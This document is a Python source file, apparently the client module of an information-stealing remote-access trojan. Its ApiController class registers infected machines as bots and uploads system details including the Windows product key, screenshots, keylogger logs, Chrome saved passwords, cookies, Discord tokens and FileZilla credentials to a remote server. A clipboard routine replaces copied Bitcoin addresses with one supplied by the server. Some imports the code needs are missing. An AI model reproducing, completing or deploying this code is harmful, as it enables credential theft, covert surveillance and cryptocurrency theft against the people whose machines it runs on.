import os
import requests
import platform
import psutil
import pyperclip

from datetime import datetime
from PIL import ImageGrab

class ApiController():
    def __init__(self, api_url, boot_config_path, screenshot_path, log_path):
        self.api_url = api_url
        self.boot_config_path = boot_config_path
        self.screenshot_path = screenshot_path
        self.log_path = log_path

    def check_connection(self):
        try:
            r = requests.get(self.api_url)
            if r.status_code == 200:
                return True
            else:
                return False
        except:
            return False
        
    def check_account(self, identifier, token):
        r = requests.get(f"{self.api_url}/bots/check/{identifier}/{token}")
        if r.status_code == 200:
            return True
        else:
            return False

    def register_account(self):
        r = requests.post(f"{self.api_url}/bots/register")
        if r.status_code == 200:
            return [r.json()["identifier"], r.json()["token"]]
        else:
            return False

    def get_size(self, bytes, suffix="B"):
        factor = 1024
        for unit in ["", "K", "M", "G", "T", "P"]:
            if bytes < factor:
                return f"{bytes:.2f}{unit}{suffix}"
            bytes /= factor

    def update_details(self, identifier, token):
        if self.check_connection():
            uname = platform.uname()

            boot_time_timestamp = psutil.boot_time()
            bt = datetime.fromtimestamp(boot_time_timestamp)

            w_key = ""
            try:    
                w_key = os.popen("wmic path softwarelicensingservice get OA3xOriginalProductKey").read().strip("OA3xOriginalProductKeyn\n").strip()
            except:
                pass
                
            hwid = ""
            try:
                hwid = os.popen("wmic csproduct get uuid")
            except:
                pass
                
            post_data = {
                "operating_system": uname.system,
                "node_name": uname.node,
                "release": uname.release,
                "version": uname.version,
                "processor": uname.processor,
                "architecture": uname.machine,
                "boot_time": f"{bt.year}-{bt.month}-{bt.day} {bt.hour}:{bt.minute}:{bt.second}",
                "cpu_cores": psutil.cpu_count(logical=True),
                "memory": self.get_size(psutil.virtual_memory().total),
                "windows_key": w_key
            }

            requests.post(f"{self.api_url}/update/details/{identifier}/{token}", json=post_data)

    def update_screenshot(self, identifier, token):
        if self.check_connection():
            image = ImageGrab.grab()
            image.save(self.screenshot_path)
            
            post_file = {"file": (self.screenshot_path, open(self.screenshot_path, "rb"))}

            requests.post(f"{self.api_url}/update/screenshot/{identifier}/{token}", files=post_file)

    def update_chrome(self, identifier, token, data):
        if self.check_connection():
            for d in data:
                post_data = {
                    "host": d["host"],
                    "user": d["user"],
                    "password": d["pass"]
                }

                requests.post(f"{self.api_url}/update/chrome/{identifier}/{token}", json=post_data)

    def update_cookies(self, identifier, token, data):
        if self.check_connection():
            post_data = {
                "cookies": data
            }

            requests.post(f"{self.api_url}/update/cookies/{identifier}/{token}", json=post_data)

    def update_discord(self, identifier, token, data):
        if self.check_connection():
            post_data = {
                "tokens": data
            }

            requests.post(f"{self.api_url}/update/discord/{identifier}/{token}", json=post_data)

    def update_filezilla(self, identifier, token, data):
        if self.check_connection():
            for d in data:
                post_data = {
                    "host": d["host"],
                    "port": d["port"],
                    "user": d["user"],
                    "password": d["pass"]
                }

                requests.post(f"{self.api_url}/update/filezilla/{identifier}/{token}", json=post_data)

    def update_logs(self, identifier, token):
        if self.check_connection() and os.path.isfile(self.log_path):
            post_file = {"file": (self.log_path, open(self.log_path, "rb"))}

            requests.post(f"{self.api_url}/update/keylogger/{identifier}/{token}", files=post_file)

    def check_boot(self, identifier, token):
        if self.check_connection():
            boot_data = requests.get(f"{self.api_url}/boot/{identifier}/{token}")

            if boot_data.status_code == 200:
                data = boot_data.json()
                if os.path.isfile(self.boot_config_path):
                    if isinstance(data, dict) and data["ip"] != None:

                        if data["ip"] != None:

                            f = open(self.boot_config_path, "r").read()
                            if f != data["identifier"]:
                                f = open(self.boot_config_path, "w+")
                                f.write(data["identifier"])
                                f.close()
                                return data
                            else:
                                return False

                        else:
                            return False

                    else:
                        return False
                        
                else:
                    if isinstance(data, dict):
                        if data["ip"] != None:
                            f = open(self.boot_config_path, "w+")
                            f.write(data["identifier"])
                            f.close()
                            return data
                        else:
                            return False
                    else:
                        return False
            else: 
                return False

    def check_clipboard(self, identifier, token):
        clip = pyperclip.paste()

        try:
            base58Decoder = base58.b58decode(clip).hex()
        except:
            return False

        prefixAndHash = base58Decoder[:len(base58Decoder)-8]
        checksum = base58Decoder[len(base58Decoder)-8:]
        
        hash = prefixAndHash

        for x in range(1,3):
            hash = hashlib.sha256(binascii.unhexlify(hash)).hexdigest()

        if(checksum == hash[:8]):
            r = requests.get(f"{self.api_url}/addresses/{identifier}/{token}")
            if r.status_code == 200:
                address = r.json()["value"]
                pyperclip.copy(address)
